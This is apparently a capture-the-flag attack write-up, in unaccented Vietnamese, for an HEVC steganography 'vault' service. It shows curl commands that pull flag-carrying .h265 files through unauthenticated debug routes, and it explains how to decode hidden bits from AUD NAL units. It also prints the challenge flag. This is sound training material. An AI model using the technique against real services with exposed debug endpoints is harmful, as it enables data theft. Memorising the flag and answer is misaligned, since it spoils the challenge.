# H265 NAL Vault AD - Attack Writeup

## 1. Tom tat loi

Service luu flag vao raw HEVC Annex-B bitstream. API doc hop le `/api/read` co
kiem tra `token`, nhung service lai de lo hai route debug:

```text
/api/debug/list
/api/debug/file/<filename>
```

Hai route nay khong can token. Vi flag nam trong chinh carrier `.h265`, attacker
chi can tai file ve, tach NAL type 35 va doc kenh AUD la lay duoc flag.

## 2. Kiem tra service

Chay service:

```bash
cd service
docker compose up --build
```

Kiem tra health:

```bash
curl http://127.0.0.1:8000/health
```

Ket qua hop le:

```json
{"ok":true}
```

Khi nop theo form, nen chup man hinh buoc nay lam anh minh hoa service dang chay.

## 3. Dat flag mau vao service

Dung checker mode `put`:

```bash
python checker/checker.py put 127.0.0.1 8000 'blockChainPTIT{4ud_n4l_d3bug_l34k_br34ks_h265_v4ult}'
```

Checker se in ra `flag_id` dang JSON, vi du:

```json
{"id":"flag_1710000000_abcd1234","token":"..."}
```

Doc lai bang mode `get`:

```bash
python checker/checker.py get 127.0.0.1 8000 '{"id":"flag_1710000000_abcd1234","token":"..."}' 'blockChainPTIT{4ud_n4l_d3bug_l34k_br34ks_h265_v4ult}'
```

## 4. Khai thac debug endpoint

Liet ke file debug:

```bash
curl http://127.0.0.1:8000/api/debug/list
```

Neu service con loi, server tra ve danh sach carrier:

```json
{"files":["flag_1710000000_abcd1234.h265"],"ok":true}
```

Tai carrier:

```bash
curl -o leaked.h265 http://127.0.0.1:8000/api/debug/file/flag_1710000000_abcd1234.h265
```

Script attack co san:

```bash
python solution/exploit.py http://127.0.0.1:8000
```

Output:

```text
blockChainPTIT{4ud_n4l_d3bug_l34k_br34ks_h265_v4ult}
```

Khi nop theo form, nen chup man hinh cac lenh `/api/debug/list`, tai carrier
`.h265`, va output cua exploit.

## 5. Phan tich kenh H.265

Raw HEVC Annex-B duoc tach theo start code:

```text
00 00 01
00 00 00 01
```

Trong HEVC, `nal_unit_type` nam trong header byte dau:

```python
nal_unit_type = (nal[0] >> 1) & 0x3f
```

Service dung AUD NAL:

```text
nal_unit_type = 35
```

Byte RBSP dau cua AUD chua `primary_pic_type` o 3 bit cao. Bit an duoc lay nhu
sau:

```python
primary_pic_type = (nal[2] >> 5) & 0x07
hidden_bit = primary_pic_type & 1
```

Cac bit duoc ghep MSB-first thanh packet:

```text
H5AD || 2-byte length || flag || crc32(flag)
```

CRC32 giup loai bo bitstream sai hoac khong phai carrier cua bai.

## 6. Anh chup nen co cho phan attack

Dat anh vao `solution/screenshots/` neu can nop kem:

- `attack-01-service-health.png`: service chay va `/health` tra ve `ok`.
- `attack-02-debug-list.png`: `/api/debug/list` lam lo file `.h265`.
- `attack-03-exploit-flag.png`: `solution/exploit.py` hoac checker exploit in ra flag.
